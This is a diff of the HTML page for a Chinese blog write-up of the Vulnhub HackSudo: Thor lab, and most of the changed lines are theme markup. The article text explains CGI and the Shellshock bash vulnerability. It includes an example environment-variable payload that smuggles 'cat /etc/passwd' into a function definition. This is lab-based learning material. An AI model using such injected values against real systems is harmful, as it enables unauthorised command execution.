@@ -1,23 +1,12 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang=zh>
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.0.0">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/icon_32.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/icon_16.png">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
-
-<script class="next-config" data-name="main" type="application/json">{"hostname":"hdfzzf.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
-<meta name="description" content="该靶机难度为中等，主要是破壳漏洞为第一次遇到，有点没底。">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="该靶机难度为中等，主要是破壳漏洞为第一次遇到，有点没底。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="10 Vulnhub HackSudoThor Writeup">
 <meta property="og:url" content="https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/index.html">
@@ -59,286 +48,158 @@
 <meta property="article:tag" content="GTFOBins提权">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412145628.png">
-
-
-<link rel="canonical" href="https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/">
-
-
-
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/","path":"2022/04/12/10 Vulnhub HackSudoThor Writeup/","title":"10 Vulnhub HackSudoThor Writeup"}</script>
-
-<script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>10 Vulnhub HackSudoThor Writeup | HDFZZF's BLOG</title>
-  
-
-
-
-
-
-  <noscript>
-    <link rel="stylesheet" href="/css/noscript.css">
-  </noscript>
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
-  <div class="headband"></div>
-  <a target="_blank" rel="noopener" href="https://github.com/hdfzzf" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
-
-  <main class="main">
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏" role="button">
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <i class="logo-line"></i>
-      <p class="site-title">HDFZZF's BLOG</p>
-      <i class="logo-line"></i>
-    </a>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-        <i class="fa fa-search fa-fw fa-lg"></i>
-    </div>
-  </div>
-</div>
-
-
-
-<nav class="site-nav">
-  <ul class="main-menu menu">
-        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
-        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
-        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
-        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
-        </a>
-      </li>
-  </ul>
-</nav>
-
-
-
-  <div class="search-pop-overlay">
-    <div class="popup search-popup"><div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off" maxlength="80"
-           placeholder="搜索..." spellcheck="false"
-           type="search" class="search-input">
-  </div>
-  <span class="popup-btn-close" role="button">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div class="search-result-container no-result">
-  <div class="search-result-icon">
-    <i class="fa fa-spinner fa-pulse fa-5x"></i>
-  </div>
-</div>
-
-    </div>
-  </div>
-
-</div>
+    
+    
+      
         
-  
-  <div class="toggle sidebar-toggle" role="button">
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-  </div>
+          <link rel="shortcut icon" href="/images/LOGO.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>10 Vulnhub HackSudoThor Writeup</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
 
-  <aside class="sidebar">
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
 
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
-      <ul class="sidebar-nav">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="الأعلى" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
       </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/04/13/SWPU2019%20Web1/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/04/12/%E5%A4%8D%E7%8E%B0%EF%BC%9ABash%20Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&text=10 Vulnhub HackSudoThor Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&title=10 Vulnhub HackSudoThor Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&is_video=false&description=10 Vulnhub HackSudoThor Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=10 Vulnhub HackSudoThor Writeup&body=Check out this article: https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&title=10 Vulnhub HackSudoThor Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&title=10 Vulnhub HackSudoThor Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&title=10 Vulnhub HackSudoThor Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&title=10 Vulnhub HackSudoThor Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&name=10 Vulnhub HackSudoThor Writeup&description=&lt;p&gt;该靶机难度为中等，主要是&lt;strong&gt;破壳漏洞&lt;/strong&gt;为第一次遇到，有点没底。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&t=10 Vulnhub HackSudoThor Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
 
-      <div class="sidebar-panel-container">
-        <!--noindex-->
-        <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-text">靶机信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#common-gateway-interface-%E5%9F%BA%E7%A1%80"><span class="nav-text">Common Gateway Interface 基础</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E"><span class="nav-text">破壳漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-text">概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF"><span class="nav-text">前置技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bash%E5%9F%BA%E7%A1%80"><span class="nav-text">bash基础</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%9A%84%E7%89%88%E6%9C%AC"><span class="nav-text">影响的版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">利用分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-text">利用场景</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-text">渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="nav-text">主机发现、端口扫描、端口服务发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="nav-text">访问http服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Eget-shell"><span class="nav-text">破壳漏洞get shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-text">权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></div>
-        </div>
-        <!--/noindex-->
-
-        <div class="site-overview-wrap sidebar-panel">
-          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="hdfzzf"
-      src="/images/zzf.jpg">
-  <p class="site-author-name" itemprop="name">hdfzzf</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap site-overview-item animated">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-        <a href="/archives/">
-          <span class="site-state-item-count">121</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-          <a href="/categories/">
-        <span class="site-state-item-count">13</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-          <a href="/tags/">
-        <span class="site-state-item-count">194</span>
-        <span class="site-state-item-name">标签</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author site-overview-item animated">
-      <span class="links-of-author-item">
-        <a href="https://github.com/hdfzzf" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;hdfzzf" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="mailto:dfhong1998@163.com" title="E-Mail → mailto:dfhong1998@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
-      </span>
-  </div>
-
-
-
-        </div>
-      </div>
     </div>
-  </aside>
-  <div class="sidebar-dimmer"></div>
-
-
-    </header>
-
-    
-  <div class="back-to-top" role="button" aria-label="返回顶部">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-  <div class="reading-progress-bar"></div>
-
-<noscript>
-  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
-</noscript>
-
-
-    <div class="main-inner post posts-expand">
-
-
-  
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/zzf.jpg">
-      <meta itemprop="name" content="hdfzzf">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="HDFZZF's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          10 Vulnhub HackSudoThor Writeup
-        </h1>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-04-12 00:00" itemprop="dateCreated datePublished" datetime="2022-04-12T00:00:00+08:00">2022-04-12</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-04-27 11:42" itemprop="dateModified" datetime="2022-04-27T11:42:18+08:00">2022-04-27</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
-        </span>
-    </span>
-
-  
-    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-eye"></i>
-      </span>
-      <span class="post-meta-item-text">阅读次数：</span>
-      <span id="busuanzi_value_page_pv"></span>
-    </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus：</span>
-    
-    <a title="disqus" href="/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2022/04/12/10 Vulnhub HackSudoThor Writeup/" itemprop="commentCount"></span>
-    </a>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#common-gateway-interface-%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text">Common Gateway Interface 基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">破壳漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">3.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF"><span class="toc-number">3.2.</span> <span class="toc-text">前置技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bash%E5%9F%BA%E7%A1%80"><span class="toc-number">3.2.1.</span> <span class="toc-text">bash基础</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%9A%84%E7%89%88%E6%9C%AC"><span class="toc-number">3.3.</span> <span class="toc-text">影响的版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.4.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="toc-number">3.5.</span> <span class="toc-text">利用分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">3.6.</span> <span class="toc-text">利用场景</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">4.1.</span> <span class="toc-text">主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.2.</span> <span class="toc-text">访问http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Eget-shell"><span class="toc-number">4.3.</span> <span class="toc-text">破壳漏洞get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.4.</span> <span class="toc-text">权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
   </span>
-  
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>4.4k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>4 分钟</span>
-    </span>
 </div>
 
-        </div>
-      </header>
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        10 Vulnhub HackSudoThor Writeup
+    </h1>
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-        <p>该靶机难度为中等，主要是<strong>破壳漏洞</strong>为第一次遇到，有点没底。</p>
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hdfzzf</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-04-11T16:00:00.000Z" itemprop="datePublished">2022-04-12</time>
+        
+        (Updated: <time datetime="2022-04-27T03:42:18.731Z" itemprop="dateModified">2022-04-27</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/GTFOBins%E6%8F%90%E6%9D%83/" rel="tag">GTFOBins提权</a>, <a class="tag-link-link" href="/tags/vulnhub/" rel="tag">vulnhub</a>, <a class="tag-link-link" href="/tags/%E5%BC%80%E6%BA%90%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" rel="tag">开源源码泄露</a>, <a class="tag-link-link" href="/tags/%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E/" rel="tag">破壳漏洞</a>, <a class="tag-link-link" href="/tags/%E7%BB%BC%E5%90%88/" rel="tag">综合</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>该靶机难度为中等，主要是<strong>破壳漏洞</strong>为第一次遇到，有点没底。</p>
 <span id="more"></span>
 <h1 id="靶机信息">靶机信息</h1>
 <p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacksudo-thor,733/">HackSudo: Thor</a></p>
@@ -399,14 +260,14 @@
 <p><strong>漏洞原理</strong>：</p>
 <p>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在<strong>输入的过滤中没有严格限制边界，也没有做出合法化的参数判断</strong>。</p>
 <p><strong>接下来才是漏洞产生的重点：</strong></p>
-<p>如果我们导入如下的字符串为全局变量： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> func=<span class="string">&#x27;() &#123; echo &quot;hello world!&quot;; &#125;; cat /etc/passwd;&#x27;</span></span><br></pre></td></tr></table></figure></p>
+<p>如果我们导入如下的字符串为全局变量： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">func</span><span class="token operator">=</span><span class="token string">'() &#123; echo "hello world!"; &#125;; cat /etc/passwd;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p>那么在当前进程下<code>func</code>不会被执行。而一旦启动子进程<code>bash</code>，则会立即执行<code>cat /etc/passwd</code>，如下</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412194456.png" /></p>
 <p>并且此时<code>func</code>也会被当作函数执行。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412194527.png" /></p>
 <p>这是因为子进程<code>bash</code>在加载环境变量时首先将<code>func</code>函数当作环境变量，然后继续加载后面的<code>cat /etc/passwd</code>，此时因为还处在shell中，会将这串字符串当作shell命令执行。因此一旦启动子进程<code>bash</code>，就会立即执行这串代码。</p>
 <p>所以该漏洞需要以下条件： 1. 被攻击的bash存在漏洞（版本小于等于4.3） 2. 攻击者可以控制环境变量 3. 新的bash进程被打开触发漏洞并执行命令</p>
